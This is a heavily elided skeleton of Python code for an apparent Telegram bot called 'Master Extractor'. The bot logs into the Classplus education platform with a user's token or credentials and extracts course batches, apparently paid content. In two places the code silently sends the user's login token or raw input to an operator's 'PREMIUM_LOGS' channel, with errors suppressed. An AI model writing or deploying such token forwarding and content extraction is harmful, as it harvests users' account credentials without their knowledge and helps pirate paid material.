...
async def classplus_txt(app, message):
    ...
    if "*" in user_input:
                    ...
                    if verify_response.status_code == 200:
                        ...
                        if verify_data['status'] == 'success':
                            ...
                            if response.status_code == 200:
                                ...
                                await fetch_batches(app, message, org_name, PREMIUM_LOGS, BOT_TEXT, time_new)
                            else:
                        ...
                        if register_response.status_code == 200:
                            ...
                            if PREMIUM_LOGS:
                                try:
                                    await app.send_message(PREMIUM_LOGS, f"<blockquote>Login successful! Token:\n\n`{token}` </blockquote>")
                                except:
                                    pass
        ...
        if PREMIUM_LOGS:
            try:
                await app.send_message(PREMIUM_LOGS, f"CLASSPLUS LOGIN WITH TOKEN\n\n<blockquote>`{user_input}`</blockquote>")
            except:
                pass
        headers = {
...
async def fetch_batches(app, message, org_name, PREMIUM_LOGS=None, BOT_TEXT="Master Extractor", time_new=""):
    ...
    if "courses" in session_data:
        ...
        if selected_index.text.isdigit():
            ...
            if 1 <= selected_idx <= len(course_list):
                ...
                await extract_batch(app, message, org_name, selected_course_id, PREMIUM_LOGS, BOT_TEXT, time_new)
            else:
...
async def extract_batch(app, message, org_name, batch_id, PREMIUM_LOGS=None, BOT_TEXT="Master Extractor", time_new=""):
    session_data = s.session_data
